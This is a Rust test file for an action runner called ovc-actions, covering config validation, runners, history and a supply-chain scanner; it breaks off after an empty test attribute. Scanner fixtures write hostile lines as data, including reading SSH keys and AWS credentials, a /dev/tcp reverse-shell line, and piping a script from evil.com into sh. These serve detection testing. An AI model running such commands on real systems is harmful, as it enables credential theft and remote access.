//! Tests for ovc-actions.

use std::collections::BTreeMap;

use crate::config::{
    ActionCategory, ActionCondition, ActionDefinition, ActionsConfig, BuiltinAction, Trigger,
};
use crate::detect::detect_languages;
use crate::history::{ActionHistory, ActionRunRecord};
use crate::runner::{ActionResult, ActionRunner, ActionStatus};

// ---- Config parsing ----

#[test]
fn parse_valid_config() {
    let yaml = r#"
defaults:
  shell: /bin/bash
  timeout: 60
actions:
  lint:
    category: lint
    command: "echo lint"
    trigger: pre-commit
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    assert_eq!(config.defaults.shell, "/bin/bash");
    assert_eq!(config.defaults.timeout, 60);
    assert!(config.actions.contains_key("lint"));
    assert_eq!(config.actions["lint"].category, ActionCategory::Lint);
}

#[test]
fn parse_invalid_yaml_returns_error() {
    let result = ActionsConfig::from_yaml("{{invalid yaml}}");
    assert!(result.is_err());
}

#[test]
fn validate_catches_missing_command_and_builtin() {
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "bad-action".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: None,
            language: None,
            tool: None,
            command: None,
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: None,
            working_dir: None,
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let issues = config.validate();
    assert!(issues.iter().any(|i| i.contains("must specify either")));
}

#[test]
fn validate_catches_zero_timeout() {
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "zero-timeout".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: None,
            language: None,
            tool: None,
            command: Some("echo hi".to_owned()),
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: Some(0),
            working_dir: None,
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let issues = config.validate();
    assert!(issues.iter().any(|i| i.contains("timeout must be > 0")));
}

#[test]
fn actions_for_trigger_filters() {
    let yaml = r#"
actions:
  a:
    command: "echo a"
    trigger: pre-commit
  b:
    command: "echo b"
    trigger: pre-push
  c:
    command: "echo c"
    trigger: pre-commit
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    let pre_commit = config.actions_for_trigger(Trigger::PreCommit);
    assert_eq!(pre_commit.len(), 2);
    let pre_push = config.actions_for_trigger(Trigger::PrePush);
    assert_eq!(pre_push.len(), 1);
}

// ---- Language detection ----

#[test]
fn detect_rust_project() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
    let result = detect_languages(dir.path());
    assert!(result.languages.iter().any(|l| l.language == "Rust"));
}

#[test]
fn detect_js_project() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), "{}").unwrap();
    let result = detect_languages(dir.path());
    assert!(result.languages.iter().any(|l| l.language == "JavaScript"));
}

#[test]
fn detect_multi_language() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
    std::fs::write(dir.path().join("go.mod"), "module test").unwrap();
    let result = detect_languages(dir.path());
    assert!(result.languages.len() >= 2);
}

// ---- Built-in: secret scan ----

#[test]
fn secret_scan_finds_aws_key() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("config.txt"),
        "aws_key = AKIAIOSFODNN7EXAMPLE\n", // ovc:ignore
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SecretScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["config.txt".to_owned()],
        "secret_scan",
        "Secret Scanner",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[AWS Access Key]"));
    assert_eq!(result.name, "secret_scan");
    assert_eq!(result.display_name, "Secret Scanner");
}

// ---- Built-in: trailing whitespace ----

#[test]
fn trailing_whitespace_detected() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("test.txt"), "hello   \nworld\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::TrailingWhitespace,
        &serde_yaml::Value::Null,
        dir.path(),
        &["test.txt".to_owned()],
        "trailing_whitespace",
        "Trailing Whitespace",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("test.txt:1"));
}

// ---- Built-in: file size ----

#[test]
fn file_size_check() {
    let dir = tempfile::tempdir().unwrap();
    // Write a file over 10 bytes, set max_bytes to 10
    std::fs::write(dir.path().join("big.txt"), "0123456789ABCDEF").unwrap();
    let config: serde_yaml::Value = serde_yaml::from_str("max_bytes: 10").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::FileSize,
        &config,
        dir.path(),
        &["big.txt".to_owned()],
        "file_size",
        "File Size Check",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("big.txt"));
}

// ---- Built-in: todo counter ----

#[test]
fn todo_counter_finds_markers() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("code.rs"),
        "// TODO: fix this\n// FIXME: also this\nfn main() {}\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::TodoCounter,
        &serde_yaml::Value::Null,
        dir.path(),
        &["code.rs".to_owned()],
        "todo_counter",
        "TODO Counter",
        false,
    )
    .unwrap();
    // Always passes (informational)
    assert_eq!(result.status, ActionStatus::Passed);
    assert!(result.stdout.contains("2 TODO/FIXME/HACK/XXX"));
}

// ---- Runner: successful command ----

#[tokio::test]
async fn runner_successful_command() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "echo-test".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: Some("Echo Test".to_owned()),
            language: None,
            tool: None,
            command: Some("echo hello".to_owned()),
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: Some(5),
            working_dir: None,
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let runner = ActionRunner::new(dir.path(), config);
    let result = runner.run_action("echo-test").await.unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
    assert!(result.stdout.contains("hello"));
}

// ---- Runner: failed command ----

#[tokio::test]
async fn runner_failed_command() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "fail-test".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: None,
            language: None,
            tool: None,
            command: Some("exit 1".to_owned()),
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: Some(5),
            working_dir: None,
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let runner = ActionRunner::new(dir.path(), config);
    let result = runner.run_action("fail-test").await.unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert_eq!(result.exit_code, Some(1));
}

// ---- Runner: timeout ----

#[tokio::test]
async fn runner_timeout() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "slow".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: None,
            language: None,
            tool: None,
            command: Some(if cfg!(target_os = "windows") {
                "ping -n 61 127.0.0.1 >nul".to_owned()
            } else {
                "sleep 60".to_owned()
            }),
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: Some(1),
            working_dir: None,
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let runner = ActionRunner::new(dir.path(), config);
    let result = runner.run_action("slow").await.unwrap();
    assert_eq!(result.status, ActionStatus::TimedOut);
}

// ---- History: record and list round-trip ----

#[test]
fn history_round_trip() {
    let dir = tempfile::tempdir().unwrap();
    let history = ActionHistory::new(dir.path());

    let record = ActionRunRecord {
        run_id: "test-run-123".to_owned(),
        trigger: "manual".to_owned(),
        timestamp: "2024-01-01T00:00:00Z".to_owned(),
        results: vec![ActionResult {
            name: "echo".to_owned(),
            display_name: "Echo".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Passed,
            exit_code: Some(0),
            stdout: "hello\n".to_owned(),
            stderr: String::new(),
            duration_ms: 42,
            started_at: "2024-01-01T00:00:00Z".to_owned(),
            finished_at: "2024-01-01T00:00:00Z".to_owned(),
            continue_on_error: false,
            ..Default::default()
        }],
        overall_status: "passed".to_owned(),
        total_duration_ms: 42,
    };

    history.record_run(&record).unwrap();

    let retrieved = history.get_run("test-run-123").unwrap().unwrap();
    assert_eq!(retrieved.run_id, "test-run-123");
    assert_eq!(retrieved.results.len(), 1);

    let runs = history.list_runs(10).unwrap();
    assert_eq!(runs.len(), 1);
}

// ---- Condition matching ----

#[test]
fn condition_glob_matching() {
    let condition = ActionCondition {
        paths: vec!["**/*.rs".to_owned()],
    };
    assert!(ActionRunner::matches_condition(
        &condition,
        &["src/main.rs".to_owned()]
    ));
    assert!(!ActionRunner::matches_condition(
        &condition,
        &["readme.md".to_owned()]
    ));
}

#[test]
fn condition_empty_paths_matches_all() {
    let condition = ActionCondition { paths: vec![] };
    assert!(ActionRunner::matches_condition(
        &condition,
        &["anything.txt".to_owned()]
    ));
}

// ---- Issue 1: Shell validation ----

#[test]
fn shell_validation_rejects_python() {
    let mut config = ActionsConfig::default();
    config.defaults.shell = "/usr/bin/python".to_owned();
    let issues = config.validate();
    assert!(
        issues.iter().any(|i| i.contains("not allowed")),
        "expected validation to reject /usr/bin/python, got: {issues:?}"
    );
}

// ---- Issue 2: working_dir path traversal ----

#[test]
fn working_dir_dotdot_rejected_by_validate() {
    let mut config = ActionsConfig::default();
    config.actions.insert(
        "traversal".to_owned(),
        ActionDefinition {
            category: ActionCategory::Custom,
            display_name: None,
            language: None,
            tool: None,
            command: Some("echo hi".to_owned()),
            fix_command: None,
            trigger: Trigger::Manual,
            timeout: Some(5),
            working_dir: Some("../etc".to_owned()),
            env: BTreeMap::new(),
            continue_on_error: false,
            condition: None,
            schedule: None,
            builtin: None,
            config: serde_yaml::Value::Null,
            ..Default::default()
        },
    );
    let issues = config.validate();
    assert!(
        issues.iter().any(|i| i.contains("path traversal")),
        "expected validation to catch '..', got: {issues:?}"
    );
}

// ---- Issue 3: Output truncation ----

#[test]
fn history_truncates_large_output() {
    let dir = tempfile::tempdir().unwrap();
    let history = ActionHistory::new(dir.path());

    // Create output larger than 64 KiB.
    let large_output = "A".repeat(80_000);

    let record = ActionRunRecord {
        run_id: "truncation-test".to_owned(),
        trigger: "manual".to_owned(),
        timestamp: "2024-01-01T00:00:00Z".to_owned(),
        results: vec![ActionResult {
            name: "big-output".to_owned(),
            display_name: "Big Output".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Passed,
            exit_code: Some(0),
            stdout: large_output,
            stderr: String::new(),
            duration_ms: 10,
            started_at: "2024-01-01T00:00:00Z".to_owned(),
            finished_at: "2024-01-01T00:00:00Z".to_owned(),
            continue_on_error: false,
            ..Default::default()
        }],
        overall_status: "passed".to_owned(),
        total_duration_ms: 10,
    };

    history.record_run(&record).unwrap();
    let retrieved = history.get_run("truncation-test").unwrap().unwrap();
    let stdout = &retrieved.results[0].stdout;
    // 64 KiB = 65536 bytes, plus the truncation marker.
    assert!(
        stdout.len() < 80_000,
        "stdout should be truncated, but was {} bytes",
        stdout.len()
    );
    assert!(
        stdout.ends_with("[truncated]"),
        "truncated output should end with [truncated] marker"
    );
}

// ---- Docker config parsing ----

#[test]
fn docker_config_parses_from_yaml() {
    let yaml = r#"
defaults:
  docker:
    enabled: true
    image: ghcr.io/olib-ai/ovc-actions:latest
    pull_policy: always
    extra_flags:
      - "--network=host"
actions:
  test:
    command: "echo hi"
    trigger: manual
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    assert!(config.defaults.docker.enabled);
    assert_eq!(
        config.defaults.docker.image,
        "ghcr.io/olib-ai/ovc-actions:latest"
    );
    assert_eq!(config.defaults.docker.pull_policy, "always");
    assert_eq!(config.defaults.docker.extra_flags, vec!["--network=host"]);
}

#[test]
fn docker_config_defaults_when_absent() {
    let yaml = r#"
actions:
  test:
    command: "echo hi"
    trigger: manual
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    assert!(!config.defaults.docker.enabled);
    assert_eq!(
        config.defaults.docker.image,
        "ghcr.io/olib-ai/ovc-actions:latest"
    );
    assert_eq!(config.defaults.docker.pull_policy, "if-not-present");
    assert!(config.defaults.docker.extra_flags.is_empty());
}

#[test]
fn docker_override_parses() {
    let yaml = r#"
actions:
  native-only:
    command: "echo native"
    trigger: manual
    docker_override: false
  docker-forced:
    command: "echo docker"
    trigger: manual
    docker_override: true
  inherit:
    command: "echo inherit"
    trigger: manual
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    assert_eq!(config.actions["native-only"].docker_override, Some(false));
    assert_eq!(config.actions["docker-forced"].docker_override, Some(true));
    assert_eq!(config.actions["inherit"].docker_override, None);
}

#[test]
fn validate_rejects_invalid_pull_policy() {
    let yaml = r#"
defaults:
  docker:
    enabled: true
    pull_policy: "invalid-policy"
actions:
  test:
    command: "echo hi"
    trigger: manual
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    let issues = config.validate();
    assert!(
        issues.iter().any(|i| i.contains("pull_policy")),
        "expected validation to reject invalid pull_policy, got: {issues:?}"
    );
}

#[test]
fn validate_warns_empty_docker_image() {
    let yaml = r#"
defaults:
  docker:
    enabled: true
    image: ""
actions:
  test:
    command: "echo hi"
    trigger: manual
"#;
    let config = ActionsConfig::from_yaml(yaml).unwrap();
    let issues = config.validate();
    assert!(
        issues.iter().any(|i| i.contains("image is empty")),
        "expected validation to warn about empty image, got: {issues:?}"
    );
}

// ---- Supply Chain Scan: env_access (tests 1-8) ----

#[test]
fn supply_chain_detects_rust_env_var() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("lib.rs"),
        "let home = std::env::var(\"HOME\").unwrap();\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["lib.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_python_os_environ() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("main.py"),
        "secret = os.environ[\"SECRET\"]\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["main.py".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_node_process_env() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("app.js"),
        "const key = process.env.API_KEY;\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["app.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_go_getenv() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("main.go"),
        "token := os.Getenv(\"TOKEN\")\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["main.go".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_java_system_getenv() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("App.java"),
        "String pass = System.getenv(\"DB_PASS\");\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["App.java".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_csharp_env() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("Program.cs"),
        "var key = Environment.GetEnvironmentVariable(\"KEY\");\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["Program.cs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_ruby_env() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("app.rb"), "secret = ENV[\"SECRET_KEY\"]\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["app.rb".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_clean_file_passes() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("clean.rs"), "let x = 42;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["clean.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

// ---- Supply Chain Scan: system_file (tests 9-14) ----

#[test]
fn supply_chain_detects_etc_passwd() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("read.py"), "open('/etc/passwd').read()\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["read.py".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

#[test]
fn supply_chain_detects_ssh_dir() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("steal.sh"), "cat ~/.ssh/id_rsa\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["steal.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

#[test]
fn supply_chain_detects_windows_registry() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("reg.ps1"),
        "Get-ItemProperty HKEY_LOCAL_MACHINE\\Software\\...\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["reg.ps1".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

#[test]
fn supply_chain_detects_aws_credentials() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("exfil.py"),
        "f = open('.aws/credentials')\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["exfil.py".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

#[test]
fn supply_chain_detects_kube_config() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("k8s.sh"), "cat .kube/config\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["k8s.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

#[test]
fn supply_chain_detects_terraform_state() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("infra.sh"), "cat terraform.tfstate\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["infra.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[system_file]"));
}

// ---- Supply Chain Scan: network (tests 15-20) ----

#[test]
fn supply_chain_detects_tcp_connect() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("net.rs"),
        "let stream = TcpStream::connect(\"evil.com:443\").unwrap();\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["net.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

#[test]
fn supply_chain_detects_reverse_shell() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("shell.sh"),
        "exec 5<>/dev/tcp/10.0.0.1/4444\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["shell.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

#[test]
fn supply_chain_detects_ethers_provider() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("web3.js"),
        "const provider = new ethers.JsonRpcProvider('https://mainnet.infura.io');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["web3.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

#[test]
fn supply_chain_detects_ipfs_gateway() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("fetch.js"),
        "fetch('https://ipfs.io/ipfs/QmTestCIDabcdefghij1234567890abcdefghijklmnopqrs');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["fetch.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

#[test]
fn supply_chain_detects_reqwest_call() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("build.rs"),
        "let body = reqwest::blocking::get(url).unwrap();\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["build.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

#[test]
fn supply_chain_detects_go_linkname() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("hack.go"),
        "//go:linkname foo runtime.bar\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["hack.go".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[network]"));
}

// ---- Supply Chain Scan: process_exec (tests 21-25) ----

#[test]
fn supply_chain_detects_rust_command() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("run.rs"),
        "Command::new(\"sh\").arg(\"-c\").spawn();\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["run.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[process_exec]"));
}

#[test]
fn supply_chain_detects_python_subprocess() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("run.py"), "subprocess.Popen([\"cmd\"])\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["run.py".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[process_exec]"));
}

#[test]
fn supply_chain_detects_node_child_process() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("exec.js"),
        "const cp = require('child_process');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["exec.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[process_exec]"));
}

#[test]
fn supply_chain_detects_java_runtime_exec() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("Exec.java"),
        "Runtime.exec(\"cmd /c calc\");\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["Exec.java".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[process_exec]"));
}

#[test]
fn supply_chain_detects_php_system() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("cmd.php"), "system(\"whoami\");\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["cmd.php".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[process_exec]"));
}

// ---- Supply Chain Scan: fs_manipulation (tests 26-30) ----

#[test]
fn supply_chain_detects_curl_pipe_sh() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("install.sh"),
        "curl https://evil.com/install.sh | sh\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["install.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

#[test]
fn supply_chain_detects_npm_postinstall() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"scripts": {"postinstall": "node setup.js"}}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["package.json".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

#[test]
fn supply_chain_detects_workflow_write() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("attack.js"),
        "writeFileSync('.github/workflows/deploy.yml', payload);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["attack.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

#[test]
fn supply_chain_detects_non_sha_action() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("ci.yml"),
        "    - uses: actions/checkout@main\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["ci.yml".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

#[test]
